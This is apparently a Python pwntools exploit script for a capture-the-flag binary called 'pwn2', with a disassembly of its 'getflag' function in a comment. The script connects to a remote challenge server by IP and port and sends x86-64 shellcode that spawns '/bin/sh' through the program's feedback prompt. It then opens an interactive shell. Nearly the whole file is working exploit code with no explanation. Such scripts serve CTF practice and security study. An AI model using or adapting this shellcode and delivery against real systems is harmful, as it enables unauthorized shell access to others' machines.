#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("pwn2")

local = False 
if local:
    p = process("./pwn2")
    gdb.attach(p,'''b*0x0000000000400767\nc''')
else:
    p = remote('139.180.137.100', 1338)

elf = context.binary = ELF('./pwn2', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

shellcode = "\x48\xFF\xC0\x48\xFF\xC8"*3 + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
print(len(shellcode))
input()
sla(b"Give me your name: ", b'abcd')  
sla(b"What do you think about the contest (feedback) ?", shellcode)  
p.interactive()


'''
Dump of assembler code for function getflag:
   0x000000000040074a <+0>:     push   rbp
   0x000000000040074b <+1>:     mov    rbp,rsp
   0x000000000040074e <+4>:     sub    rsp,0x20
   0x0000000000400752 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000400756 <+12>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000040075a <+16>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040075e <+20>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400762 <+24>:    mov    eax,0x0
   0x0000000000400767 <+29>:    call   rdx
   0x0000000000400769 <+31>:    nop
   0x000000000040076a <+32>:    leave
   0x000000000040076b <+33>:    ret
   '''